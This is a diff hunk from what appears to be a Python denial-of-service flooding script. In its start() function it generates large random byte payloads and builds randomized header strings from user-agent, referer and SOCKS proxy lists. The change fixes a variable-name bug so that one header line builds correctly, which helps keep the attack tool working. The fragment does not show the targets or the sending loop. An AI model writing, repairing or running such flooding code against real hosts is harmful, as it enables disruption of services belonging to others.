@@ -440,7 +440,7 @@ def start():
   hh = random._urandom(75006)
   byte2 = random._urandom(34002)
   xx = int(0)
-  byte3 = "Sockets2: "+random.choice(UserAgents)+random.choice(acceptall)+random.choice(ref)+random.choice(socks5)+random.choice(socks2)+"\r\n"
+  byte3 = "Sockets2: "+random.choice(useragents)+random.choice(acceptall)+random.choice(ref)+random.choice(socks5)+random.choice(socks2)+"\r\n"
   userKagen = "UserAgents: "+random.choice(useragents)+random.choice(acceptall)+random.choice(ref)+"\r\n"
   Userkw = "Binatang: "+random.choice(socks5)+random.choice(ref)+random.choice(useragents)+random.choice(acceptall)+"\r\n"
   acceptser = "AcceptAdmin: "+random.choice(acceptall)+random.choice(ref)+"\r\n"
